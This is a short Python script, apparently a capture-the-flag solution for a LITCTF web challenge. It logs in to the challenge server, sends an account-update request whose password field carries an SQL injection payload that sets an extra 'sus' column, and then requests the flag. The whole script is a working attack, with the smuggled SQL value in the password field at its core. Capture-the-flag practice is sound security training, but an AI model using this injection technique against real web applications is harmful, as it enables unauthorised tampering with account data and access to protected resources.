import requests
import json

def main():
    url = "http://litctf.org:31783/"

    data = {
        "username" : "test1",
        "password" : "test1"
    }
    r = requests.post(url=url+"login", data=data)
    auth = json.loads(r.text)["token"]
    print(auth)
    
    print("更新账户")
    data = {
        "username" : "test1",
        "password" : "test1\",sus=1--"
    }
    headers = {
        "Authorization" : auth
    }
    r = requests.post(url=url+"account/update",data=data,headers=headers)
    print(r.text)
    print("获得flag")
    
    r = requests.get(url+"flag", headers=headers)
    print(r.text)


if __name__ == "__main__":
    main()
